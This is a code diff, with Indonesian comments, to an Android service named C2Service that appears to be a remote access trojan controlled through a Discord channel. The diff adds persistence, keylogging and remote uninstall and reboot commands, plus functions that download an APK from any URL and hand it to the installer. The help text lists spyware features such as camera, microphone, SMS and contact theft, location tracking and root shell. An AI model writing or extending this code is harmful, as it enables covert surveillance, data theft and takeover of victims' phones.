@@ -327,6 +327,16 @@ class C2Service : Service() {
             "battery" -> battery()
             "perm", "perms" -> perms()
             "boot" -> boot(arg)
+            // Nama-nama di bawah ini sengaja sama dengan versi PC supaya
+            // otot yang sudah terbentuk di channel tidak perlu dilatih ulang.
+            "persist" -> boot("on")
+            "unpersist" -> boot("off")
+            "update" -> updateCmd(arg)
+            "x", "exec", "run" -> execUrl(arg)
+            "uninstall" -> say(Actions.uninstall(this))
+            "taskkill" -> kill(arg)
+            "keys" -> keylog(arg)
+            "power" -> say(Actions.reboot(this, arg))
             else -> say("? $verb")
         }
         // Balasan sudah dikirim di dalam handler.
@@ -356,9 +366,9 @@ class C2Service : Service() {
         }
     }
 
-    /** sha256 APK, 8 huruf. Ini yang membedakan build baru dari build usang. */
-    private fun apkSha(path: String): String {
-        if (path.isEmpty()) return "?"
+    /** sha256 penuh dalam hex. Dipakai `update` untuk memverifikasi unduhan. */
+    private fun sha256Hex(path: String): String {
+        if (path.isEmpty()) return ""
         return try {
             val md = MessageDigest.getInstance("SHA-256")
             File(path).inputStream().use { ins ->
@@ -369,11 +379,14 @@ class C2Service : Service() {
                     md.update(buf, 0, n)
                 }
             }
-            md.digest().take(4).joinToString("") { "%02x".format(it) }
+            md.digest().joinToString("") { "%02x".format(it) }
         } catch (e: Exception) {
-            "?"
+            ""
         }
     }
+
+    /** sha256 APK, 8 huruf. Ini yang membedakan build baru dari build usang. */
+    private fun apkSha(path: String): String = sha256Hex(path).take(8).ifEmpty { "?" }
 
     /**
      * Kartu identitas perangkat. Kalau ada lebih dari satu HP di channel yang
@@ -408,10 +421,13 @@ class C2Service : Service() {
     private fun help() = say(
         "cara alamatkan: ![alias] <verb>  ![uuid8] <verb>  !@[pola] <verb>  !* <verb>\n" +
             "alias perangkat ini: !$deviceTag   uuid ${Config.uuid.take(8)}\n\n" +
-            "who info sys ping sh cd ls dl up shot cam mic clip ps kill msg toast notify " +
-            "tts vib vol torch loc sms smsread contacts calls apps ip storage battery " +
-            "wifi root reboot perm boot keylog rick black block open inst grab " +
-            "rm mv gh sleep close exit purge"
+            "identitas : who info sys ping\n" +
+            "file      : sh cd ls dl up rm mv gh x update inst open uninstall\n" +
+            "media     : shot cam mic clip keylog keys\n" +
+            "kontrol   : ps kill taskkill msg toast notify tts vib vol torch\n" +
+            "data      : loc sms smsread contacts calls apps ip storage battery wifi\n" +
+            "sistem    : root power reboot perm persist unpersist boot\n" +
+            "layar     : rick black block grab sleep close exit purge"
     )
 
     private fun ping() {
@@ -731,6 +747,91 @@ class C2Service : Service() {
         val target = Vfs.resolve(cwd, parts.getOrNull(1) ?: "gh.bin")
         val r = Discord.download(url, target)
         say(if (r.first) "GH ${r.second}" else "GH ${r.second}")
+    }
+
+    /**
+     * `x <url>` — padanan `x` di versi PC.
+     *
+     * Android tidak punya "jalankan file". Kalau yang diunduh APK, dia
+     * diserahkan ke installer (tetap ada dialog konfirmasi tanpa root); kalau
+     * bukan, filenya mendarat di cache dan path-nya dikembalikan apa adanya.
+     */
+    private fun execUrl(arg: String) {
+        val url = arg.trim().split(" ").firstOrNull().orEmpty()
+        if (!url.startsWith("http")) {
+            say("pakai: x <url>")
+            return
+        }
+        val name = url.substringAfterLast('/').substringBefore('?').ifEmpty { "x.bin" }
+        val dest = File(cacheDir, name)
+        val r = Discord.download(url, dest)
+        if (!r.first) {
+            say("ERR unduh: ${r.second}")
+            return
+        }
+        if (name.lowercase().endsWith(".apk")) {
+            say(Actions.install(this, dest.absolutePath))
+        } else {
+            say("X ${dest.absolutePath} (${Vfs.human(dest.length())}) — bukan apk, Android tidak bisa exec")
+        }
+    }
+
+    /**
+     * `update`              ringkasan build yang sedang jalan
+     * `update <url> [sha]`  unduh APK, verifikasi sha256 kalau dikasih, lalu
+     *                       serahkan ke installer
+     *
+     * Sama seperti versi PC: tanpa sha tetap jalan, hanya saja tidak ada
+     * jaminan byte yang mendarat itu yang dimaksud.
+     */
+    private fun updateCmd(arg: String) {
+        val parts = arg.trim().split(" ")
+        val url = parts.getOrNull(0)?.trim().orEmpty()
+
+        if (url.isEmpty()) {
+            val pkg = try {
+                packageManager.getPackageInfo(packageName, 0)
+            } catch (e: Exception) {
+                null
+            }
+            val apk = pkg?.applicationInfo?.sourceDir ?: ""
+            say(
+                "apk    : $apk\n" +
+                    "ukuran : ${if (apk.isNotEmpty() && File(apk).isFile) File(apk).length() else 0} B\n" +
+                    "sha256 : ${sha256Hex(apk).ifEmpty { "?" }}\n" +
+                    "versi  : ${pkg?.versionName ?: "?"}   sdk ${Build.VERSION.SDK_INT}\n" +
+                    "pakai  : update <url> [sha256]"
+            )
+            return
+        }
+
+        if (!url.startsWith("http")) {
+            say("pakai: update <url> [sha256]")
+            return
+        }
+        if (!Actions.canInstall(this)) {
+            say("ERR izin 'install unknown apps' belum aktif untuk aplikasi ini")
+            return
+        }
+
+        val dest = File(cacheDir, "update.apk")
+        val r = Discord.download(url, dest)
+        if (!r.first) {
+            say("ERR unduh: ${r.second}")
+            return
+        }
+
+        val want = parts.getOrNull(1)?.trim()?.lowercase().orEmpty()
+        val got = sha256Hex(dest.absolutePath)
+        if (want.isNotEmpty() && want != got) {
+            val size = dest.length()
+            dest.delete()
+            say("ERR sha tidak cocok — dibatalkan\nminta : $want\ndapat : $got\nukuran: $size B")
+            return
+        }
+
+        say("unduh OK  ${File(dest.absolutePath).length()} B  sha ${got.take(8)}")
+        say(Actions.install(this, dest.absolutePath))
     }
 
     private fun rm(path: String) {
